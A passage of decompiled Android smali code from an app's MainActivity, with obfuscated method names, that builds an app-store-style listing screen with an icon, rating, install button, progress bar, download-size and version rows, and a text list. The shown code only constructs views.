    invoke-direct {v12, v0}, Landroid/widget/ScrollView;-><init>(Landroid/content/Context;)V

    const/4 v1, -0x1

    .line 107
    invoke-virtual {v12, v1}, Landroid/view/View;->setBackgroundColor(I)V

    .line 108
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v13

    .line 109
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vpNdwwpwBwplN()Landroid/widget/LinearLayout;

    move-result-object v1

    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 110
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->NGL7fgNWbzfZaqgpQY()Landroid/view/View;

    move-result-object v1

    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 111
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v1

    const/16 v15, 0xe

    .line 112
    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    const/16 v3, 0x10

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v1, v2, v4, v5, v6}, Landroid/view/View;->setPadding(IIII)V

    .line 113
    invoke-virtual {v1, v3}, Landroid/widget/LinearLayout;->setGravity(I)V

    const/16 v2, 0x40

    .line 114
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->iTycxX30d0YvQFAGBVYP(I)Landroid/widget/ImageView;

    move-result-object v2

    .line 115
    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/4 v4, 0x0

    invoke-static {v2, v4, v4, v3, v4}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 116
    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 117
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v2

    const v3, 0x7f0f001c

    .line 118
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v5

    const/16 v6, 0x14

    invoke-virtual {v0, v5, v6, v14, v4}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v3, 0x7f0f00b1

    .line 119
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    iget v5, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    const/16 v15, 0xd

    invoke-virtual {v0, v3, v15, v5, v4}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 120
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v3

    const/16 v5, 0x10

    .line 121
    invoke-virtual {v3, v5}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 122
    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    invoke-virtual {v3, v4, v5, v4, v4}, Landroid/view/View;->setPadding(IIII)V

    .line 123
    const-string v5, "\u2605"

    iget v15, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    invoke-virtual {v0, v5, v7, v15, v4}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v5

    invoke-virtual {v3, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 124
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v15, " "

    invoke-direct {v5, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const v15, 0x7f0f00ba

    invoke-virtual {v0, v15}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x1

    invoke-virtual {v0, v5, v7, v14, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v5

    .line 125
    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-static {v5, v4, v4, v6, v4}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 126
    invoke-virtual {v3, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 127
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "\u00b7  "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const v6, 0x7f0f00b2

    invoke-virtual {v0, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, "  \u00b7  Everyone"

    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5, v7, v10, v4}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v5

    invoke-virtual {v3, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 128
    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 129
    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v5, -0x2

    const/high16 v11, 0x3f800000    # 1.0f

    invoke-direct {v3, v4, v5, v11}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v1, v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 130
    const-string v11, "p2anim"

    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 131
    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 132
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v1

    .line 133
    iget v2, v0, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx:I

    invoke-virtual {v1, v2}, Landroid/view/View;->setBackgroundColor(I)V

    const/16 v2, 0xe

    .line 134
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v15

    invoke-virtual {v1, v3, v4, v5, v15}, Landroid/view/View;->setPadding(IIII)V

    const/16 v2, 0x30

    .line 135
    invoke-virtual {v1, v2}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 136
    const-string v2, "\u21bb"

    iget v3, v0, Lio/bluewave/app/MainActivity;->gkAIcPzaF0mdk:I

    const/16 v4, 0x14

    const/4 v5, 0x0

    invoke-virtual {v0, v2, v4, v3, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    const/4 v15, 0x2

    .line 137
    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/16 v4, 0xa

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-static {v2, v5, v3, v6, v5}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 138
    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 139
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v2

    const v3, 0x7f0f00bf

    .line 140
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0xd

    const/4 v6, 0x1

    invoke-virtual {v0, v3, v4, v14, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v3, 0x7f0f00be

    .line 141
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0xc

    invoke-virtual {v0, v3, v4, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    const/4 v6, 0x3

    .line 142
    invoke-virtual {v0, v6}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v3, v5, v4, v5, v5}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 143
    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 144
    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v4, -0x2

    const/high16 v6, 0x3f800000    # 1.0f

    invoke-direct {v3, v5, v4, v6}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v1, v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 145
    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 146
    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 147
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    const/16 v2, 0xe

    .line 148
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/16 v5, 0x10

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    invoke-virtual {v1, v3, v4, v6, v2}, Landroid/view/View;->setPadding(IIII)V

    .line 149
    new-instance v2, Landroid/widget/Button;

    invoke-direct {v2, v0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    iput-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    const v3, 0x7f0f0028

    .line 150
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 151
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    const/4 v3, -0x1

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextColor(I)V

    .line 152
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    const/high16 v6, 0x41600000    # 14.0f

    invoke-virtual {v2, v15, v6}, Landroid/widget/TextView;->setTextSize(IF)V

    .line 153
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    sget-object v3, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 154
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setAllCaps(Z)V

    .line 155
    new-instance v2, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v2}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 156
    iget v3, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    invoke-virtual {v2, v3}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/16 v3, 0x8

    .line 157
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    int-to-float v3, v4

    invoke-virtual {v2, v3}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 158
    iget-object v3, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    invoke-virtual {v3, v2}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 159
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    int-to-float v3, v3

    invoke-virtual {v2, v3}, Landroid/view/View;->setElevation(F)V

    .line 160
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/view/View;->setStateListAnimator(Landroid/animation/StateListAnimator;)V

    .line 161
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    const/16 v4, 0x14

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/16 v5, 0xc

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v2, v3, v6, v7, v4}, Landroid/view/View;->setPadding(IIII)V

    .line 162
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    new-instance v3, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;

    const/4 v4, 0x1

    invoke-direct {v3, v0, v4}, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;-><init>(Lio/bluewave/app/MainActivity;I)V

    invoke-virtual {v2, v3}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 163
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v4, -0x2

    const/4 v5, -0x1

    invoke-direct {v3, v5, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 164
    new-instance v2, Landroid/widget/ProgressBar;

    const v3, 0x1010078

    const/4 v4, 0x0

    invoke-direct {v2, v0, v4, v3}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V

    iput-object v2, v0, Lio/bluewave/app/MainActivity;->vpNdwwpwBwplN:Landroid/widget/ProgressBar;

    const/16 v3, 0x64

    .line 165
    invoke-virtual {v2, v3}, Landroid/widget/ProgressBar;->setMax(I)V

    .line 166
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->vpNdwwpwBwplN:Landroid/widget/ProgressBar;

    const/16 v7, 0x8

    invoke-virtual {v2, v7}, Landroid/view/View;->setVisibility(I)V

    .line 167
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v3, 0x4

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-direct {v2, v5, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 168
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    iput v3, v2, Landroid/widget/LinearLayout$LayoutParams;->topMargin:I

    .line 169
    iget-object v3, v0, Lio/bluewave/app/MainActivity;->vpNdwwpwBwplN:Landroid/widget/ProgressBar;

    invoke-virtual {v1, v3, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 170
    const-string v2, ""

    const/16 v4, 0xc

    const/4 v5, 0x0

    invoke-virtual {v0, v2, v4, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    iput-object v2, v0, Lio/bluewave/app/MainActivity;->NGL7fgNWbzfZaqgpQY:Landroid/widget/TextView;

    const/16 v6, 0x11

    .line 171
    invoke-virtual {v2, v6}, Landroid/widget/TextView;->setGravity(I)V

    .line 172
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->NGL7fgNWbzfZaqgpQY:Landroid/widget/TextView;

    invoke-virtual {v2, v7}, Landroid/view/View;->setVisibility(I)V

    .line 173
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->NGL7fgNWbzfZaqgpQY:Landroid/widget/TextView;

    const/4 v3, 0x4

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v2, v5, v4, v5, v5}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 174
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->NGL7fgNWbzfZaqgpQY:Landroid/widget/TextView;

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 175
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v2

    .line 176
    invoke-virtual {v2, v6}, Landroid/widget/LinearLayout;->setGravity(I)V

    const/16 v3, 0xe

    .line 177
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v2, v5, v4, v5, v5}, Landroid/view/View;->setPadding(IIII)V

    const v3, 0x7f0f00b3

    .line 178
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v4

    const-string v3, "Download size"

    invoke-virtual {v0, v4, v3}, Lio/bluewave/app/MainActivity;->WAxAMT28akcO(Ljava/lang/String;Ljava/lang/String;)Landroid/widget/LinearLayout;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 179
    new-instance v3, Landroid/view/View;

    invoke-direct {v3, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 180
    iget v6, v0, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W:I

    invoke-virtual {v3, v6}, Landroid/view/View;->setBackgroundColor(I)V

    .line 181
    new-instance v4, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v5, 0x1e

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    const/4 v7, 0x1

    invoke-direct {v4, v7, v5}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v2, v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 182
    const-string v3, "1.0.0"

    const-string v4, "Version"

    invoke-virtual {v0, v3, v4}, Lio/bluewave/app/MainActivity;->WAxAMT28akcO(Ljava/lang/String;Ljava/lang/String;)Landroid/widget/LinearLayout;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 183
    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 184
    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 185
    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 186
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5()Landroid/view/View;

    move-result-object v1

    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 187
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    const/16 v2, 0xe

    .line 188
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/16 v5, 0x10

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    invoke-virtual {v1, v3, v4, v7, v2}, Landroid/view/View;->setPadding(IIII)V

    const v2, 0x7f0f0107

    .line 189
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    const/16 v7, 0xf

    const/4 v3, 0x1

    invoke-virtual {v0, v2, v7, v14, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v2, 0x7f0f0106

    .line 190
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    array-length v3, v2

    const/4 v4, 0x0

    :goto_1
    if-ge v4, v3, :cond_3

    aget-object v5, v2, v4

    .line 191
    invoke-virtual {v5}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/String;->isEmpty()Z

    move-result v17

    if-eqz v17, :cond_2

    move-object/from16 v18, v2

    move/from16 v23, v3

    goto :goto_2

    .line 192
    :cond_2
    invoke-virtual {v5}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    const/16 v7, 0xd

    const/4 v15, 0x0

    invoke-virtual {v0, v5, v7, v14, v15}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v5

    const/16 v7, 0xe

    .line 193
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v15

    move-object/from16 v18, v2

    const/4 v7, 0x4

    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    move/from16 v23, v3

    const/4 v7, 0x2

    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/4 v7, 0x0

    invoke-virtual {v5, v15, v2, v7, v3}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 194
    invoke-virtual {v1, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    :goto_2
    add-int/lit8 v4, v4, 0x1

    move-object/from16 v2, v18

    move/from16 v3, v23

    const/16 v7, 0xf

    const/4 v15, 0x2

    goto :goto_1

    .line 195
    :cond_3
    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 196
    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 197
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5()Landroid/view/View;

    move-result-object v1

    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 198
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    const/16 v15, 0xe

    .line 199
    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    const/16 v5, 0x10

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    invoke-virtual {v1, v2, v3, v4, v7}, Landroid/view/View;->setPadding(IIII)V

    const v2, 0x7f0f00af

    .line 200
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    const/16 v4, 0xf

    invoke-virtual {v0, v2, v4, v14, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 201
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v2

    const/16 v4, 0xc

    .line 202
    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v3, v5, v5}, Landroid/view/View;->setPadding(IIII)V

    .line 203
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v3

    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v4

    const v7, 0x7f0f00b8

    .line 204
    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v15, 0xb

    invoke-virtual {v0, v7, v15, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v3, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v7, 0x7f0f00b4

    .line 205
    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v15, 0xd

    invoke-virtual {v0, v7, v15, v14, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v3, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const/16 v7, 0xc

    .line 206
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v15

    .line 207
    new-instance v7, Landroid/view/View;

    invoke-direct {v7, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    invoke-virtual {v7, v15}, Landroid/view/View;->setMinimumHeight(I)V

    .line 208
    invoke-virtual {v3, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v7, 0x7f0f00b6

    .line 209
    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v15, 0xb

    invoke-virtual {v0, v7, v15, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v3, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v7, 0x7f0f00b2

    .line 210
    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v15, 0xd

